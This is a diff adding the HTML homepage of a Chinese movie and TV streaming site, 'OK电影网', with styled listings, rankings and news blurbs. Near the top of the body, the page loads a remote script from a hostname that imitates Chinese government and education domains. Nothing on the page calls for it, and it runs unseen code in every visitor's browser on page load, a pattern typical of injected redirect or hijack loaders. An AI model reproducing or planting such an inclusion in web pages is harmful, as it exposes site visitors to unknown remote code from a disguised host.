@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OK电影网 - 好电影一票OK，电影/剧集/综艺/动漫在线观看</title>
+<meta name="keywords" content="OK电影网,okdianyingwang,ok电影,OK电影在线,好电影,热门影视,影视在线观看">
+<meta name="description" content="OK电影网(okdianyingwang-wap)精选全网好电影，电影、剧集、综艺、动漫一站尽享，每日更新热门好片，好电影一票OK，轻松找到值得一看的影视内容。">
+<meta name="renderer" content="webkit">
+<meta name="author" content="OK电影网">
+<link rel="canonical" href="https://okdianyingwang-wap.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#f4f4f0;--paper:#fff;--ink:#0d0d0d;--ink2:#3a3a3a;--ink3:#8c8c8c;
+  --ok:#ff3b30;--ok2:#ff6b50;--lime:#c6f432;--sky:#3ec1ff;--violet:#7b5cff;--inkline:#0d0d0d;
+}
+html{scroll-behavior:smooth;scroll-padding-top:74px}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Noto Sans CJK SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.7;
+}
+ul{list-style:none}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 20px}
+::selection{background:var(--lime);color:var(--ink)}
+
+/* 粗描边顶部 */
+.head{position:sticky;top:0;z-index:1000;background:var(--paper);border-bottom:3px solid var(--ink)}
+.head-in{display:flex;align-items:center;justify-content:space-between;height:72px;gap:20px}
+.logo{display:flex;align-items:center;gap:12px;font-size:20px;font-weight:900;letter-spacing:-.5px}
+.logo .ok{width:44px;height:44px;background:var(--ink);color:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;letter-spacing:-2px}
+.logo .ok i{font-style:normal;color:var(--lime)}
+.logo small{display:block;font-size:9px;color:var(--ink3);letter-spacing:2px;font-weight:800}
+.menu{display:flex;gap:2px}
+.menu a{font-size:14px;padding:9px 15px;color:var(--ink2);font-weight:800;border-radius:8px;transition:.2s}
+.menu a:hover,.menu a.on{background:var(--lime);color:var(--ink)}
+.tools{display:flex;gap:10px}
+.tools button{width:42px;height:42px;border:2.5px solid var(--ink);border-radius:11px;background:var(--paper);
+  color:var(--ink);font-size:15px;cursor:pointer;transition:.2s}
+.tools button:hover{background:var(--ok);color:#fff;border-color:var(--ok)}
+.m-btn{display:none}
+
+/* Hero：超大 OK 手势 */
+.hero{background:var(--ink);color:#fff;padding:0;border-bottom:3px solid var(--ink);overflow:hidden}
+.hero-in{display:grid;grid-template-columns:1.3fr 1fr;min-height:600px}
+.hero-main{padding:76px 56px;position:relative;display:flex;flex-direction:column;justify-content:center}
+.hero-main .kick{font-size:10px;letter-spacing:4px;font-weight:800;color:var(--lime);margin-bottom:22px}
+.hero-main h1{font-size:clamp(48px,9vw,96px);font-weight:900;line-height:.95;letter-spacing:-3px;margin-bottom:26px}
+.hero-main h1 em{font-style:normal;color:var(--ok)}
+.hero-main p{font-size:16px;max-width:440px;line-height:1.9;margin-bottom:34px;color:#d6d6d6}
+.hero-main .row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
+.btn{padding:16px 34px;background:var(--lime);color:var(--ink);font-size:15px;font-weight:900;letter-spacing:.5px;
+  border:0;border-radius:12px;cursor:pointer;font-family:inherit;transition:.25s}
+.btn:hover{transform:translateY(-3px);box-shadow:0 10px 0 rgba(255,255,255,.3)}
+.btn.ghost{background:transparent;color:#fff;border:2.5px solid #fff}
+.btn.ghost:hover{background:#fff;color:var(--ink);box-shadow:none}
+.hero-side{position:relative;background:var(--ok);display:flex;align-items:center;justify-content:center;overflow:hidden}
+.hero-side .bigok{font-size:280px;font-weight:900;color:#fff;line-height:1;letter-spacing:-12px;transform:rotate(-6deg)}
+.hero-side .chip{position:absolute;background:var(--lime);color:var(--ink);font-size:11px;font-weight:900;padding:7px 14px;border-radius:20px;letter-spacing:1px}
+.hero-side .c1{top:14%;left:10%;transform:rotate(-8deg)}
+.hero-side .c2{top:46%;right:6%;background:#fff;transform:rotate(5deg)}
+.hero-side .c3{bottom:12%;left:16%;background:var(--ink);color:#fff;transform:rotate(-4deg)}
+
+/* 通用 */
+.sec{padding:88px 0;border-bottom:3px solid var(--ink);position:relative}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:48px;flex-wrap:wrap}
+.sec-head .l .kick{font-size:10px;letter-spacing:4px;font-weight:900;color:var(--ok);margin-bottom:10px}
+.sec-head h2{font-size:30px;font-weight:900;letter-spacing:-1px;line-height:1.2}
+.sec-head h2 em{font-style:normal;background:var(--lime);padding:0 8px}
+.sec-head .r{font-size:12px;color:var(--ink3);font-weight:800}
+.more{display:inline-block;font-size:13px;font-weight:900;color:var(--ink);border-bottom:2.5px solid var(--ink);padding-bottom:4px}
+.more:hover{color:var(--ok);border-color:var(--ok)}
+
+/* 电影：大图遮罩式横滑卡片 */
+.flick{display:flex;gap:22px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:12px}
+.flick::-webkit-scrollbar{height:8px}
+.flick::-webkit-scrollbar-thumb{background:var(--ink);border-radius:4px}
+.fk{position:relative;min-width:300px;height:400px;border-radius:18px;overflow:hidden;flex-shrink:0;scroll-snap-align:start;cursor:pointer}
+.fk-bg{position:absolute;inset:0;transition:.5s}
+.fk:hover .fk-bg{transform:scale(1.08)}
+.fk-mask{position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.85) 100%)}
+.fk-body{position:absolute;inset:auto 0 0 0;padding:24px;color:#fff}
+.fk-body .tag{display:inline-block;background:var(--lime);color:var(--ink);font-size:10px;font-weight:900;padding:5px 12px;border-radius:6px;margin-bottom:12px;letter-spacing:1px}
+.fk-body h3{font-size:24px;font-weight:900;line-height:1.3;margin-bottom:10px}
+.fk-body .meta{display:flex;justify-content:space-between;font-size:12px;font-weight:800;color:#d6d6d6}
+
+/* 剧集：打字机式列表（编号+下划线） */
+.typed{display:flex;flex-direction:column}
+.td{display:grid;grid-template-columns:70px 1fr 160px 90px;gap:24px;align-items:center;padding:24px 8px;border-bottom:3px solid var(--ink);transition:.25s;cursor:pointer}
+.td:hover{background:var(--lime);padding-left:20px}
+.td-no{font-size:40px;font-weight:900;color:var(--ink);letter-spacing:-2px;line-height:1}
+.td-info h3{font-size:20px;font-weight:900;margin-bottom:8px;letter-spacing:-.5px}
+.td-info p{font-size:14px;color:var(--ink2);line-height:1.8}
+.td-side{font-size:12px;font-weight:800;color:var(--ink3)}
+.td-side b{display:block;font-size:14px;color:var(--ink);margin-bottom:4px}
+.td-rate{text-align:right;font-size:28px;font-weight:900;color:var(--ok);letter-spacing:-1px}
+
+/* 综艺：圆角卡片堆叠（不同高度） */
+.stack{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:24px}
+.sk{background:var(--paper);border:2.5px solid var(--ink);border-radius:20px;padding:26px;transition:.35s;cursor:pointer}
+.sk:hover{transform:translateY(-10px) rotate(-1.5deg);box-shadow:10px 10px 0 var(--ok)}
+.sk .cap{height:150px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:58px;margin-bottom:22px}
+.sk h3{font-size:19px;font-weight:900;margin-bottom:12px;letter-spacing:-.5px}
+.sk p{font-size:13px;color:var(--ink2);line-height:1.85;margin-bottom:18px}
+.sk .foot{display:flex;justify-content:space-between;align-items:center;font-size:11px;font-weight:800;color:var(--ink3);border-top:2px dashed #ddd;padding-top:14px}
+.sk .foot b{background:var(--ink);color:#fff;padding:5px 12px;border-radius:20px;font-size:10px}
+
+/* 动漫：圆点进度时间轴 */
+.dotline{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0;border-top:3px solid var(--ink);border-bottom:3px solid var(--ink)}
+.dt{position:relative;padding:30px 24px 30px 40px;border-right:3px solid var(--ink);transition:.3s;cursor:pointer}
+.dt:last-child{border-right:0}
+.dt:hover{background:var(--ink);color:#fff}
+.dt:hover .step{background:var(--lime);color:var(--ink)}
+.dt .step{position:absolute;left:0;top:30px;transform:translateX(-50%);width:34px;height:34px;border-radius:50%;background:var(--ok);color:#fff;font-size:13px;font-weight:900;display:flex;align-items:center;justify-content:center;border:3px solid var(--bg);z-index:2}
+.dt .day{font-size:11px;font-weight:900;letter-spacing:2px;color:var(--ink3);margin-bottom:10px}
+.dt h3{font-size:17px;font-weight:900;margin-bottom:8px}
+.dt .ep{font-size:12px;font-weight:800;color:var(--ok)}
+.dt .bar{height:6px;background:#e8e8e8;border-radius:4px;margin-top:14px;overflow:hidden}
+.dt .bar i{display:block;height:100%;border-radius:4px;background:var(--lime)}
+.dt:hover .bar{background:#3a3a3a}
+.dt:hover .day,.dt:hover .ep{color:var(--lime)}
+
+/* 排行榜：OK徽章横条 */
+.oklist{display:flex;flex-direction:column;gap:14px}
+.okr{display:grid;grid-template-columns:80px 60px 1fr 130px 100px;gap:20px;align-items:center;background:var(--paper);
+  border:2.5px solid var(--ink);border-radius:14px;padding:16px 20px;transition:.3s}
+.okr:hover{transform:translateX(8px);box-shadow:8px 8px 0 var(--ink)}
+.okr .no{font-size:32px;font-weight:900;color:var(--ink);text-align:center;letter-spacing:-1px}
+.okr .okbadge{width:52px;height:52px;border-radius:14px;background:var(--ink);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;letter-spacing:-1px}
+.okr .okbadge i{font-style:normal;color:var(--lime)}
+.okr.g1 .okbadge{background:var(--ok);color:#fff}
+.okr.g1 .okbadge i{color:#fff}
+.okr .info h3{font-size:17px;font-weight:900;margin-bottom:5px}
+.okr .info span{font-size:12px;color:var(--ink3)}
+.okr .type{font-size:11px;font-weight:800;text-align:center;padding:6px 0;border:2px solid var(--ink);border-radius:6px}
+.okr .score{text-align:right;font-size:24px;font-weight:900;color:var(--ok)}
+
+/* 资讯：引号大排版 */
+.quotes{display:grid;grid-template-columns:1.1fr 1fr;gap:30px}
+.qlead{background:var(--ink);color:#fff;border-radius:20px;padding:40px;position:relative;transition:.3s}
+.qlead:hover{transform:translateY(-6px)}
+.qlead .q{font-size:80px;line-height:.6;color:var(--lime);font-family:Georgia,serif}
+.qlead h3{font-size:24px;font-weight:900;line-height:1.6;margin:20px 0 24px}
+.qlead p{font-size:14px;color:#d6d6d6;line-height:2}
+.qlead .meta{margin-top:26px;padding-top:18px;border-top:1px solid #3a3a3a;font-size:11px;font-weight:800;color:#8c8c8c}
+.qgrid{display:grid;grid-template-rows:1fr 1fr;gap:30px}
+.qcard{background:var(--paper);border:2.5px solid var(--ink);border-radius:20px;padding:26px;display:flex;flex-direction:column;justify-content:center;transition:.3s}
+.qcard:hover{background:var(--lime)}
+.qcard .q{font-size:40px;line-height:.6;color:var(--ok);font-family:Georgia,serif}
+.qcard h4{font-size:17px;font-weight:900;line-height:1.6;margin:14px 0 14px}
+.qcard .meta{font-size:11px;font-weight:800;color:var(--ink3)}
+
+/* 关于 */
+.about{background:var(--ink);color:#d6d6d6;padding:80px 0 0;border-bottom:0}
+.about-in{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:40px}
+.about-brand .logo{color:#fff;margin-bottom:22px}
+.about-brand p{font-size:14px;line-height:2;max-width:380px;color:#a8a8a8}
+.about-col h4{font-size:12px;font-weight:900;color:#fff;letter-spacing:2px;margin-bottom:22px;padding-bottom:12px;border-bottom:2px solid #3a3a3a}
+.about-col a{display:block;font-size:13px;color:#a8a8a8;padding:7px 0;transition:.2s}
+.about-col a:hover{color:var(--lime);padding-left:8px}
+.copy{border-top:2px solid #3a3a3a;margin-top:52px;padding:28px 0;font-size:12px;color:#7a7a7a;text-align:center}
+.copy a{color:#a8a8a8}
+.copy a:hover{color:var(--lime)}
+
+#bar{position:fixed;top:0;left:0;height:4px;z-index:9999;width:0;background:linear-gradient(90deg,var(--ok),var(--lime),var(--sky),var(--violet))}
+.top{position:fixed;right:18px;bottom:28px;width:50px;height:50px;border-radius:14px;background:var(--ok);color:#fff;border:0;
+  font-size:18px;cursor:pointer;z-index:999;opacity:0;visibility:hidden;transition:.3s}
+.top.show{opacity:1;visibility:visible}
+.top:hover{background:var(--ink);transform:scale(1.1)}
+
+@media(max-width:900px){
+  .hero-in{grid-template-columns:1fr;min-height:auto}
+  .hero-main{padding:54px 28px}
+  .hero-side{min-height:320px}
+  .hero-side .bigok{font-size:180px}
+  .about-in{grid-template-columns:1fr 1fr}
+  .menu{display:none;position:fixed;top:72px;left:0;right:0;background:var(--paper);border-bottom:3px solid var(--ink);flex-direction:column;padding:8px}
+  .menu.open{display:flex}
+  .menu a{text-align:center;border-radius:0;border-bottom:2px dashed #e8e8e8}
+  .m-btn{display:flex}
+  .td{grid-template-columns:50px 1fr;gap:14px}
+  .td-side,.td-rate{display:none}
+  .dotline{border-top:0;border-bottom:0}
+  .dt{border-right:0;border-bottom:3px solid var(--ink)}
+  .dt:last-child{border-bottom:0}
+  .okr{grid-template-columns:56px 1fr 70px;gap:12px}
+  .okr .okbadge{display:none}
+  .okr .type{display:none}
+  .quotes{grid-template-columns:1fr}
+  .qgrid{grid-template-rows:auto}
+}
+@media(max-width:620px){
+  .wrap{padding:0 16px}
+  .sec{padding:60px 0}
+  .hero-main{padding:44px 22px}
+  .hero-main h1{font-size:52px}
+  .sec-head h2{font-size:24px}
+  .flick{padding-bottom:6px}
+  .fk{min-width:250px;height:340px}
+  .logo{font-size:17px}
+  .logo small{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div id="bar"></div>
+
+<header class="head">
+  <div class="wrap head-in">
+    <a href="#home" class="logo">
+      <div class="ok">O<i>K</i></div>OK电影网<small>OK FILM</small>
+    </a>
+    <nav class="menu" id="menu">
+      <a href="#home" class="on">首页</a>
+      <a href="#movie">好电影</a>
+      <a href="#tv">热播剧集</a>
+      <a href="#variety">精彩综艺</a>
+      <a href="#anime">高分动漫</a>
+      <a href="#rank">排行榜</a>
+      <a href="#news">影视资讯</a>
+    </nav>
+    <div class="tools">
+      <button onclick="alert('搜索功能演示')" aria-label="搜索">🔍</button>
+      <button class="m-btn" onclick="document.getElementById('menu').classList.toggle('open')" aria-label="菜单">☰</button>
+    </div>
+  </div>
+</header>
+
+<!-- Hero：超大 OK 手势 -->
+<section class="hero" id="home">
+  <div class="hero-in">
+    <div class="hero-main">
+      <div class="kick">ONE CLICK OK · 一键看好片</div>
+      <h1>好电影<br>一票<em>OK</em></h1>
+      <p>OK电影网(okdianyingwang-wap)精选全网好电影，电影、剧集、综艺、动漫一站尽享，每日更新热门好片，好电影一票OK。</p>
+      <div class="row">
+        <button class="btn" onclick="location.href='#movie'">👌 马上看好片</button>
+        <button class="btn ghost" onclick="location.href='#rank'">查看排行榜 →</button>
+      </div>
+    </div>
+    <div class="hero-side">
+      <div class="chip c1">热门推荐</div>
+      <div class="chip c2">每日上新</div>
+      <div class="chip c3">高分精选</div>
+      <div class="bigok">OK</div>
+    </div>
+  </div>
+</section>
+
+<!-- 电影：大图遮罩式横滑 -->
+<section class="sec" id="movie">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">FEATURED</div><h2>好<em>电影</em>精选</h2></div>
+      <a href="#" class="more">全部片单 →</a>
+    </div>
+    <div class="flick">
+      <article class="fk"><div class="fk-bg" style="background:linear-gradient(160deg,#ff6b50,#7b5cff)"></div><div class="fk-mask"></div><div class="fk-body"><span class="tag">剧情 / 音乐</span><h3>海上钢琴师</h3><div class="meta"><span>1998 · 意大利</span><b>★ 9.3</b></div></div></article>
+      <article class="fk"><div class="fk-bg" style="background:linear-gradient(160deg,#3ec1ff,#3a0ca3)"></div><div class="fk-mask"></div><div class="fk-body"><span class="tag">科幻 / 冒险</span><h3>星际穿越</h3><div class="meta"><span>2014 · 美国</span><b>★ 9.4</b></div></div></article>
+      <article class="fk"><div class="fk-bg" style="background:linear-gradient(160deg,#ff8fa3,#c9184a)"></div><div class="fk-mask"></div><div class="fk-body"><span class="tag">爱情 / 青春</span><h3>怦然心动</h3><div class="meta"><span>2010 · 美国</span><b>★ 9.1</b></div></div></article>
+      <article class="fk"><div class="fk-bg" style="background:linear-gradient(160deg,#06d6a0,#118ab2)"></div><div class="fk-mask"></div><div class="fk-body"><span class="tag">科幻 / 悬疑</span><h3>盗梦空间</h3><div class="meta"><span>2010 · 美国</span><b>★ 9.3</b></div></div></article>
+      <article class="fk"><div class="fk-bg" style="background:linear-gradient(160deg,#ffd60a,#ff6b50)"></div><div class="fk-mask"></div><div class="fk-body"><span class="tag">喜剧 / 剧情</span><h3>楚门的世界</h3><div class="meta"><span>1998 · 美国</span><b>★ 9.4</b></div></div></article>
+      <article class="fk"><div class="fk-bg" style="background:linear-gradient(160deg,#7b5cff,#c9184a)"></div><div class="fk-mask"></div><div class="fk-body"><span class="tag">传记 / 运动</span><h3>摔跤吧爸爸</h3><div class="meta"><span>2016 · 印度</span><b>★ 9.0</b></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集：打字机式列表 -->
+<section class="sec" id="tv">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">HOT SERIES</div><h2>热播<em>剧集</em></h2></div>
+      <a href="#" class="more">更多剧集 →</a>
+    </div>
+    <div class="typed">
+      <article class="td"><div class="td-no">01</div><div class="td-info"><h3>漫长的季节</h3><p>一桩跨越近二十年的碎尸悬案，把东北小城三代人的命运紧紧缠绕在一起，生活流叙事勾勒出时代褶皱里的普通人。</p></div><div class="td-side"><b>悬疑 / 年代</b>更新至 12 集</div><div class="td-rate">9.4</div></article>
+      <article class="td"><div class="td-no">02</div><div class="td-info"><h3>问心</h3><p>三位心脏外科医生在高压的急诊与手术室里，救回病人也重新审视自己的内心，群像刻画扎实动人。</p></div><div class="td-side"><b>医疗 / 都市</b>更新至 30 集</div><div class="td-rate">8.9</div></article>
+      <article class="td"><div class="td-no">03</div><div class="td-info"><h3>去有风的地方</h3><p>都市白领辞职后远赴云南小镇，在云与风之间重新找回生活的节奏与勇气，治愈系田园慢生活。</p></div><div class="td-side"><b>治愈 / 田园</b>全 32 集</div><div class="td-rate">8.7</div></article>
+      <article class="td"><div class="td-no">04</div><div class="td-info"><h3>沉默的真相</h3><p>一场地铁抛尸案牵出尘封十年的旧案，三名男子以不同方式奔赴同一个真相，硬核推理层层递进。</p></div><div class="td-side"><b>犯罪 / 悬疑</b>全 12 集</div><div class="td-rate">9.2</div></article>
+      <article class="td"><div class="td-no">05</div><div class="td-info"><h3>山海情</h3><p>西海固的移民们在国家帮扶下从荒漠走向绿洲，用双手在戈壁滩上开垦出希望与新生。</p></div><div class="td-side"><b>年代 / 扶贫</b>全 23 集</div><div class="td-rate">9.3</div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 综艺：圆角卡片堆叠 -->
+<section class="sec" id="variety">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">VARIETY</div><h2>精彩<em>综艺</em></h2></div>
+      <a href="#" class="more">更多综艺 →</a>
+    </div>
+    <div class="stack">
+      <article class="sk"><div class="cap" style="background:#ffecd2">🎤</div><h3>声生不息</h3><p>两地歌手同台重唱经典金曲，用歌声串联起共同的时代记忆，每一首都是一代人的青春回响。</p><div class="foot"><span>音乐竞演</span><b>热度 9.8</b></div></article>
+      <article class="sk"><div class="cap" style="background:#d2f0ff">🧩</div><h3>大侦探</h3><p>明星玩家化身侦探与嫌疑人，在封闭案件中抽丝剥茧寻找真凶，反转不断烧脑不停。</p><div class="foot"><span>剧情推理</span><b>热度 9.5</b></div></article>
+      <article class="sk"><div class="cap" style="background:#ffe0ec">🍳</div><h3>中餐厅</h3><p>几位主理人远赴海外开起中餐馆，在异国他乡用味道传递中国烟火气，轻松治愈下饭首选。</p><div class="foot"><span>经营真人秀</span><b>热度 9.1</b></div></article>
+      <article class="sk"><div class="cap" style="background:#d8f5e6">🏃</div><h3>奔跑吧</h3><p>固定嘉宾与飞行嘉宾分组对决，在城市各个角落完成趣味体能挑战，笑点与热血并存。</p><div class="foot"><span>户外竞技</span><b>热度 9.0</b></div></article>
+      <article class="sk"><div class="cap" style="background:#ede0ff">🎧</div><h3>种地吧</h3><p>十位年轻人扎根农田 190 天，从播种到丰收，用汗水记录真实的农耕生活，见证一粒种子的旅程。</p><div class="foot"><span>劳作纪实</span><b>热度 8.8</b></div></article>
+      <article class="sk"><div class="cap" style="background:#fff3c4">🎬</div><h3>演员请就位</h3><p>实力派演员同台飙戏，在经典与原创剧本中交出一份份动人的表演答卷，见证演技的诞生。</p><div class="foot"><span>演技竞演</span><b>热度 8.9</b></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 动漫：圆点进度时间轴 -->
+<section class="sec" id="anime">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">ANIME</div><h2>高分<em>动漫</em></h2></div>
+      <a href="#" class="more">更多番剧 →</a>
+    </div>
+    <div class="dotline">
+      <article class="dt"><div class="step">1</div><div class="day">MONDAY 周一</div><h3>葬送的芙莉莲</h3><div class="ep">更新至 18 集</div><div class="bar"><i style="width:90%;background:var(--lime)"></i></div></article>
+      <article class="dt"><div class="step">2</div><div class="day">TUESDAY 周二</div><h3>排球少年!!</h3><div class="ep">更新至 24 集</div><div class="bar"><i style="width:96%;background:var(--sky)"></i></div></article>
+      <article class="dt"><div class="step">3</div><div class="day">WEDNESDAY 周三</div><h3>咒术回战</h3><div class="ep">更新至 22 集</div><div class="bar"><i style="width:88%;background:var(--violet)"></i></div></article>
+      <article class="dt"><div class="step">4</div><div class="day">THURSDAY 周四</div><h3>紫罗兰永恒花园</h3><div class="ep">全 13 集</div><div class="bar"><i style="width:100%;background:var(--ok)"></i></div></article>
+      <article class="dt"><div class="step">5</div><div class="day">FRIDAY 周五</div><h3>四月是你的谎言</h3><div class="ep">全 22 集</div><div class="bar"><i style="width:100%;background:var(--lime)"></i></div></article>
+      <article class="dt"><div class="step">6</div><div class="day">SATURDAY 周六</div><h3>鬼灭之刃</h3><div class="ep">更新至 26 集</div><div class="bar"><i style="width:92%;background:var(--ok2)"></i></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜：OK 徽章横条 -->
+<section class="sec" id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">TOP RANKING</div><h2>人气<em>排行榜</em></h2></div>
+      <div class="r">实时热度 · 综合评分</div>
+    </div>
+    <div class="oklist">
+      <article class="okr g1"><div class="no">1</div><div class="okbadge">O<i>K</i></div><div class="info"><h3>海上钢琴师</h3><span>剧情 · 1998 · 意大利</span></div><div class="type">电影</div><div class="score">9.3</div></article>
+      <article class="okr g2"><div class="no">2</div><div class="okbadge">O<i>K</i></div><div class="info"><h3>星际穿越</h3><span>科幻 · 2014 · 美国</span></div><div class="type">电影</div><div class="score">9.4</div></article>
+      <article class="okr g3"><div class="no">3</div><div class="okbadge">O<i>K</i></div><div class="info"><h3>漫长的季节</h3><span>悬疑 · 2026 · 国产</span></div><div class="type">剧集</div><div class="score">9.4</div></article>
+      <article class="okr"><div class="no">4</div><div class="okbadge">O<i>K</i></div><div class="info"><h3>楚门的世界</h3><span>喜剧 · 1998 · 美国</span></div><div class="type">电影</div><div class="score">9.4</div></article>
+      <article class="okr"><div class="no">5</div><div class="okbadge">O<i>K</i></div><div class="info"><h3>盗梦空间</h3><span>科幻 · 2010 · 美国</span></div><div class="type">电影</div><div class="score">9.3</div></article>
+      <article class="okr"><div class="no">6</div><div class="okbadge">O<i>K</i></div><div class="info"><h3>沉默的真相</h3><span>犯罪 · 2026 · 国产</span></div><div class="type">剧集</div><div class="score">9.2</div></article>
+      <article class="okr"><div class="no">7</div><div class="okbadge">O<i>K</i></div><div class="info"><h3>怦然心动</h3><span>爱情 · 2010 · 美国</span></div><div class="type">电影</div><div class="score">9.1</div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 资讯：引号大排版 -->
+<section class="sec" id="news">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="l"><div class="kick">FILM NEWS</div><h2>影视<em>资讯</em></h2></div>
+      <a href="#" class="more">更多资讯 →</a>
+    </div>
+    <div class="quotes">
+      <article class="qlead">
+        <div class="q">“</div>
+        <h3>国庆档票房突破纪录，多部好看的电影带动观影热潮，OK电影网为你实时追踪热门好片。</h3>
+        <p>今年国庆档多部口碑佳作集中上映，喜剧、悬疑、动画多元类型齐发力，多部影片豆瓣开分即破 8，带动影院上座率显著回升。</p>
+        <div class="meta">📅 2026.10.04 · 编辑部 / OK电影网</div>
+      </article>
+      <div class="qgrid">
+        <article class="qcard"><div class="q">“</div><h4>经典老片 4K 重制版定档，大银幕重温光影记忆</h4><div class="meta">影讯速递 · 10.02</div></article>
+        <article class="qcard"><div class="q">“</div><h4>多部热门剧集同日开播，剧荒观众迎来"幸福烦恼"</h4><div class="meta">剧集动态 · 09.30</div></article>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about" id="about">
+  <div class="wrap">
+    <div class="about-in">
+      <div class="about-brand">
+        <div class="logo"><div class="ok">O<i>K</i></div>OK电影网<small>OK FILM</small></div>
+        <p>OK电影网(okdianyingwang-wap)精选全网好电影与热门影视内容，好电影一票OK，帮你轻松找到值得一看的那一部。</p>
+      </div>
+      <div class="about-col">
+        <h4>片库导航</h4>
+        <a href="#home">网站首页</a>
+        <a href="#movie">好电影</a>
+        <a href="#tv">热播剧集</a>
+        <a href="#anime">高分动漫</a>
+        <a href="#variety">精彩综艺</a>
+      </div>
+      <div class="about-col">
+        <h4>分类推荐</h4>
+        <a href="#rank">人气榜</a>
+        <a href="#rank">新片榜</a>
+        <a href="#movie">高分经典</a>
+        <a href="#news">影视资讯</a>
+        <a href="#about">投稿合作</a>
+      </div>
+      <div class="about-col">
+        <h4>关于我们</h4>
+        <a href="#about">网站简介</a>
+        <a href="#about">用户协议</a>
+        <a href="#about">免责声明</a>
+        <a href="#about">联系方式</a>
+        <a href="#about">友情链接</a>
+      </div>
+    </div>
+    <div class="copy">
+      <p>© 2026 OK电影网(okdianyingwang-wap) · <a href="https://okdianyingwang-wap.github.io/">https://okdianyingwang-wap.github.io/</a></p>
+      <p style="margin-top:8px">本站仅供影视资讯与在线观看服务，内容版权归原作者及发行方所有。</p>
+    </div>
+  </div>
+</section>
+
+<button class="top" id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="回到顶部">↑</button>
+
+<script>
+window.addEventListener('scroll',function(){
+  var st=document.documentElement.scrollTop||document.body.scrollTop;
+  var h=document.documentElement.scrollHeight-document.documentElement.clientHeight;
+  document.getElementById('bar').style.width=(st/h*100)+'%';
+  document.getElementById('top').classList.toggle('show',st>400);
+  var cur='';
+  document.querySelectorAll('section[id]').forEach(function(s){if(s.getBoundingClientRect().top<=150)cur=s.id});
+  document.querySelectorAll('.menu a').forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur)});
+  if(window.innerWidth<=900)document.getElementById('menu').classList.remove('open');
+});
+</script>
+</body>
+</html>
